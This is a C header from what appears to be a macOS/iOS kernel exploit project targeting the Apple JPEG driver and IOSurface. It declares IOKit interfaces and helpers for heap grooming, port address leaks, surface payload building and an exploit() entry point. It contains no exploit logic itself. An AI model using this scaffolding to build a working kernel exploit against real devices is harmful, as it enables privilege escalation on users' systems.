//
//  code.h
//  jpeg
//
//  Created by mg on 1/6/20.
//  Copyright © 2020 mg. All rights reserved.
//

#ifndef code_h
#define code_h

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>
#include <mach/mach_error.h>
#include <mach/mach_time.h>
#include <CoreFoundation/CoreFoundation.h>
#include <pthread.h>

#include <sys/types.h>
#include <sys/sysctl.h>
#include <sys/utsname.h>

//int start;
#define self    mach_task_self()
#define CHECK_MACH_ERR(kr,name)  do {       \
if (kr != KERN_SUCCESS) {       \
    printf("%s : %s (0x%x)\n", \
    name,mach_error_string(kr),kr);\
    exit(1); }           \
}while(0);

#define MB  * 1024 * 1024
// taken from Ian Beer exploits
#define IKM_SIZE(size) \
    (message_size_for_kalloc_size((size)) - sizeof(struct simple_msg))


enum {
    kIODefaultMemoryType        = 0
};

enum {
    kIODefaultCache             = 0,
    kIOInhibitCache             = 1,
    kIOWriteThruCache           = 2,
    kIOCopybackCache            = 3,
    kIOWriteCombineCache        = 4,
    kIOCopybackInnerCache       = 5,
    kIOPostedWrite              = 6,
    kIORealTimeCache            = 7,
    kIOPostedReordered          = 8,
    kIOPostedCombinedReordered  = 9,
};

// IOMemory mapping options
enum {
    kIOMapAnywhere                = 0x00000001,

    kIOMapCacheMask               = 0x00000f00,
    kIOMapCacheShift              = 8,
    kIOMapDefaultCache            = kIODefaultCache            << kIOMapCacheShift,
    kIOMapInhibitCache            = kIOInhibitCache            << kIOMapCacheShift,
    kIOMapWriteThruCache          = kIOWriteThruCache          << kIOMapCacheShift,
    kIOMapCopybackCache           = kIOCopybackCache           << kIOMapCacheShift,
    kIOMapWriteCombineCache       = kIOWriteCombineCache       << kIOMapCacheShift,
    kIOMapCopybackInnerCache      = kIOCopybackInnerCache      << kIOMapCacheShift,
    kIOMapPostedWrite             = kIOPostedWrite             << kIOMapCacheShift,
    kIOMapRealTimeCache           = kIORealTimeCache           << kIOMapCacheShift,
    kIOMapPostedReordered         = kIOPostedReordered         << kIOMapCacheShift,
    kIOMapPostedCombinedReordered = kIOPostedCombinedReordered << kIOMapCacheShift,

    kIOMapUserOptionsMask         = 0x00000fff,

    kIOMapReadOnly                = 0x00001000,

    kIOMapStatic                  = 0x01000000,
    kIOMapReference               = 0x02000000,
    kIOMapUnique                  = 0x04000000,
#ifdef XNU_KERNEL_PRIVATE
    kIOMap64Bit                   = 0x08000000,
#endif
    kIOMapPrefault                = 0x10000000,
    kIOMapOverwrite               = 0x20000000
};


enum {
    kOSSerializeDictionary   = 0x01000000U,
    kOSSerializeArray        = 0x02000000U,
    kOSSerializeSet          = 0x03000000U,
    kOSSerializeNumber       = 0x04000000U,
    kOSSerializeSymbol       = 0x08000000U,
    kOSSerializeString       = 0x09000000U,
    kOSSerializeData         = 0x0a000000U,
    kOSSerializeBoolean      = 0x0b000000U,
    kOSSerializeObject       = 0x0c000000U,
    kOSSerializeTypeMask     = 0x7F000000U,
    kOSSerializeDataMask     = 0x00FFFFFFU,

    kOSSerializeEndCollection = 0x80000000U,
};

#define kOSSerializeBinarySignature        0x000000d3

// IOKIT
typedef mach_port_t io_connect_t;
typedef mach_port_t io_service_t;
typedef mach_port_t io_iterator_t;
typedef mach_port_t io_object_t;
typedef mach_port_t io_registry_entry_t;
typedef    char            io_name_t[128];
typedef uint64_t u64;
typedef unsigned int u32;
typedef unsigned short u16;
typedef unsigned char u8;
#define IO_OBJECT_NULL 0
extern const mach_port_t kIOMasterPortDefault;


kern_return_t IOConnectCallMethod(mach_port_t connection, uint32_t selector, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectCallAsyncMethod(mach_port_t connection, uint32_t selector, mach_port_t wake_port, uint64_t *reference, uint32_t referenceCnt, const uint64_t *input, uint32_t inputCnt, const void *inputStruct, size_t inputStructCnt, uint64_t *output, uint32_t *outputCnt, void *outputStruct, size_t *outputStructCnt);
kern_return_t IOConnectMapMemory(io_connect_t connect, uint32_t memoryType, task_port_t intoTask, mach_vm_address_t *atAddress, mach_vm_size_t *ofSize, uint32_t options);
kern_return_t IOConnectAddClient(io_connect_t connect, io_connect_t client);
io_service_t IOServiceGetMatchingService(mach_port_t masterPort, CFDictionaryRef matching);
kern_return_t IOServiceOpen(io_service_t service, task_port_t owningTask, uint32_t type,io_connect_t *connect);
boolean_t IOIteratorIsValid(io_iterator_t iterator);
io_object_t IOIteratorNext(io_iterator_t iterator);
kern_return_t IORegistryEntryGetName(io_registry_entry_t entry, io_name_t name);
kern_return_t IOServiceGetMatchingServices(mach_port_t masterPort, CFDictionaryRef matching, io_iterator_t *existing);
kern_return_t IOServiceClose(io_connect_t connect);
uint32_t IOObjectGetRetainCount(io_object_t object);
uint32_t IOObjectGetKernelRetainCount(io_object_t object);
uint32_t IOObjectGetRetainCount(io_object_t object);
kern_return_t io_object_get_retain_count(mach_port_t object,uint32_t *retainCount);
kern_return_t IOObjectRelease(io_object_t object);
kern_return_t IORegistryEntrySetCFProperties(io_registry_entry_t entry, CFTypeRef properties);
kern_return_t IOConnectSetNotificationPort(io_connect_t connect, uint32_t type, mach_port_t port, uintptr_t reference);
kern_return_t IOConnectTrap6(io_connect_t connect, uint32_t index, uintptr_t p1, uintptr_t p2, uintptr_t p3, uintptr_t p4, uintptr_t p5, uintptr_t p6);
CFMutableDictionaryRef IOServiceMatching(const char *name);
CFDataRef IOCFSerialize(CFTypeRef object, CFOptionFlags options);
CFTypeRef IOCFUnserialize(const char *buffer, CFAllocatorRef allocator, CFOptionFlags options, CFStringRef *errorString);
CFStringRef IOObjectCopyClass(io_object_t object);
mach_port_t allocate_port(void);
void free_connections(void);
io_connect_t iokit_get_connection(const char *name,u32 type);


// JPEG Driver
void  startDecoder(io_connect_t c,char *inputBuf);
char *prepare_setDecoder(u32 callback);
void  startDecoderExt(io_connect_t c,char *inputBuf);
char *prepare_setDecoderExt(void);

// IOSurface
io_connect_t get_surface_client(void);
io_connect_t create_surface(io_connect_t surface,u32 *surface_id,CFDataRef data);
void iosurface_set_value(io_connect_t surface,uint32_t surface_id);
void iosurface_get_property(io_connect_t surface,uint32_t surface_id,uint32_t key,void *output,size_t *outputSize);
void iosurface_remove_property(io_connect_t surface,uint32_t surface_id,uint32_t key);
void iosurface_remove_value(io_connect_t surface,CFDataRef data,u32 surface_id);
CFDataRef build_surface_payload(uint32_t target_kalloc,char *data,uint32_t datasize,uint32_t key);
CFDataRef build_surface_payload_with_string(uint32_t count,char *string,uint32_t stringsize,uint32_t key);
void iosurface_create_port(io_connect_t surface,uint32_t surface_id,mach_port_t  *port_name);
void iosurface_get_value(io_connect_t surface,void *input,uint32_t inputSize,void *output,size_t *outputSize);
void read_iosurface_buffer(void);
void reset_iosurface_buffer(uint32_t init_value);
void set_detach_mode_code(io_connect_t c,uint32_t arg1,uint32_t arg2,uint32_t arg3,uint32_t arg4);
void get_graphics_comm_page_address(io_connect_t surface,uint64_t *out);
void set_indexed_timestamp(io_connect_t c,uint32_t surface_id,uint64_t index,uint64_t value);
uint32_t lookup_surface_port(io_connect_t surface,mach_port_t sr);


void allocate_properties_buf(void);
void deallocate_properties_buf(void);
//void * IOSurfaceLookup(u32 csid);
//void * IOSurfaceGetBaseAddress(void * buffer);
//main
void doit(void);
u64 leak_port(mach_port_t port);
void hexdump(const void* data, size_t size);
int comp_uint64(const void *a, const void *b);
CFNumberRef uintcf(uint value);
void fill_kalloc_map_with_kmsg(void);
bool check_kmsg_success(void);
void exploit(void);

kern_return_t custom_io_connect_add_client(mach_port_t connection,mach_port_t connect_to,mach_port_t reply);
#endif /* code_h */
